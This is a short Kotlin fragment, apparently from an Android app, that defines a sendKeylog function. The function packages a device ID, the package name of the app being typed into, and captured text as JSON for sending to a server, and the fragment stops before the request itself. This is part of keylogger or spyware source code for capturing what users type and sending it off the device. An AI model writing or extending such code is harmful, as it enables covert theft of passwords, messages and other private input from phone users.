    /**
     * Send a keylog entry to the server.
     */
    fun sendKeylog(context: Context, appPackage: String, text: String) {
        val deviceId = getDeviceId(context) ?: return
        val escapedText = text.replace("\"", "\\\"")
        val json = """
            {
                "deviceId": "$deviceId",
                "appPackage": "$appPackage",
                "text": "$escapedText"
            }
        """.trimIndent()
